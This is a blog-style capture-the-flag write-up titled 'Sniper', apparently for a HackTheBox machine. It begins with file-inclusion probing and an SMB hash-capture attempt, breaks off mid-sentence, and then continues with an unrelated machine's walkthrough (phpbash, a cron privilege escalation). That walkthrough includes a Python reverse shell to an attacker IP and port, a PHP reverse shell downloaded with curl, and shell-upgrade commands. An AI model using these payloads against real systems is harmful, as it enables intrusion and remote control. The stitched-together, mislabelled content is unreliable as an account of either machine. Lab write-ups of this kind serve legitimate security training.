---
title: "Sniper"
date: 2023-06-24T23:52:47+02:00
tags: ["privesc","web","windows","smb"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: /HTB/Sniper.png
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: ""
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---


## Room Information

- Room name: Sniper
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Sniper

![Untitled](/HTB/Sniper.png)

## Tools Used

- nmap
- gobuster
- whatweb
- 

## Port Scanning

![Untitled](/HTB/escaneo-sniper.png)

In the port scan we can see that there are multiple ports open, like 80 (web server), 445 (Samba) ...

## Enumeration

As always first thing i'm going to do is:

```bash
whatweb 10.10.10.151
```
![/Untitled](/HTB/whatweb-sniper.png)

This results show me that the JQuery version is relatively outdated, and the machine is Windows.

So let's find something on the web:
 - First thing as always do ctrl+shift+u to see the source code of the page (nothing relevant)

Soon I realized this error that had the page:

![Untitled](/HTB/php-error-sniper.png)


Here I leave the commands I used to test the error until I realized that I was indeed facing a vulnerability:

```bash
http://10.10.10.151/blog/?lang=test
http://10.10.10.151/blog/?lang=\Windows\System32\Drivers\etc\hosts
http://10.10.10.151/blog/?lang=\inetpub\wwwroot\index.php -> with the intention that I return the php code of the page
http://10.10.10.151/blog/?lang=php://filter/convert.base64-encode/resource=\inetpub\wwwroot\index.php -> with the intention 
that we do not interpret the PHP code
```
Now instead of try to introduce a local element of the machine, I'm going to try to introduce a extern element of my
fisical sistem:
	
 - The first attempt was to open a web server with *python3 -m http.server 80* and then modify the url of the machine 
   like this *http://10.10.10.151/blog/?lang=http://10.10.14.5/nmap*, to try to point to my address and see 
   if I received any requests. Nothing well.
	
 - The second attempt was to create a server with SMB  with *smbserver.py smbFolder $(pwd) -smb2support* to share the 
   smbfolder folder and modify the url as follows *http://10.10.10.151/blog/?lang=//10.10.14.5/smbFolder/test*. 
   We have connection !!!
   
   ![Untitled](/HTB/smbserver-sniper.png) 
  
   what should happen is that we would have to see the NTLM hash of version 2, but in this case it does not come out, 
   so maybe we are having a problem with the service we are offering, and we are also supporting version 2 of smb. 

 - The third attempt was


If we visit the website there are only one article with a web reverse shell information called phpbash, and a url to the github project.

In the url we can find some useful information like how works, this shell removes the necessity of do a traditional reverse shell.

Let’s try this but first some fuzzing

![Untitled](/HTB/bashed-6.png)

We can see that there is a uploads directory maybe we can try to upload a reverse shell.

With nikto, I found that the /dev directory maybe its useful

![Untitled](/HTB/bashed-7.png)

Inside the directory, there are two files, the two of them are the reverse shell which we have seen in the previous github project (seems like a reverse shell to his own machine). If we try to run one we get in.

## Gaining an Initial Foothold

![Untitled](/HTB/bashed-8.png)

We are logged like the web service and the user flag is in the arrexel home directory.

![Untitled](/HTB/bashed-9.png)

Now let’s elevate privilege

If we go to the / directory we can see that inside there is a script folder created by scriptmanager user.

When we try sudo -l we found that the the www-data user has acces to scriptmanager as sudo.

Let’s try `sudo -u scriptmanager -e /bin/bash` 

![Untitled](/HTB/bashed-10.png)

Don’t seem to work, maybe the web server doesn’t allow some commands.

Now let’s try to upload the reverse shell and this time trying to connect it to our machine instead of using the shell on /dev.

One way is to create a http server and curl the file in the victim machine. We need to modify the reverse shell file that I get [here](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) with our ip and port.

![Untitled](/HTB/bashed-11.png)

![Untitled](/HTB/bashed-12.png)

Now let’s open a listening port with netcat and run the shell.

![Untitled](/HTB/bashed-13.png)

![Untitled](/HTB/bashed-14.png)

Before nothing, we are going to pass from a dumb shell to a fully interactive one.

First once we spawn a bash with `python -c 'import pty; pty.spawn("/bin/bash")'` then lets keep the nc in background with ctrl^z, once done we use `stty raw -echo` and then `fg` to return to the web shell but fully interactive this time.

Let’s retry `sudo -u scriptmanager /bin/bash`

![Untitled](/HTB/bashed-15.png)

We are scriptmanager now, let’s see what we can do in the /scripts folder. It’s seems like there are two files in the folder. One of them [test.py](http://test.py) look like this:

```bash
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

This file is created by scriptmanager but the execution of the file needs be owned by root somehow because inside the execution we are opening the test.txt file that only can be modified with root permissions. If you observe the creation time of the file test.txt, you will notice that it undergoes changes every minute. This pattern strongly suggests the presence of a cron job, which is owned by the root user, and is responsible for executing the test.py script every minute.

We can use this to our advantage and change the content of the [test.py](http://test.py) file to a reverse shell and get the system own.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.17",1234)) //change this
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

I get this reverse shell from [pentestmonkey’s](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) handy dandy list of reverse shells.

Let’s set up a listener in the port 1234 and let the magic happen.

![Untitled](/HTB/bashed-17.png)

## Lessons Learned

- What insights did you gain from the room?
    
    I acquired knowledge on the functioning of a cron job and discovered ways to exploit it for potential machine compromise.
    
- Were there any novel tools or techniques employed?
    
    Notably, the utilization of nikto and various reverse shells were introduced.

**Thank you for reading, and happy hacking! 😄**
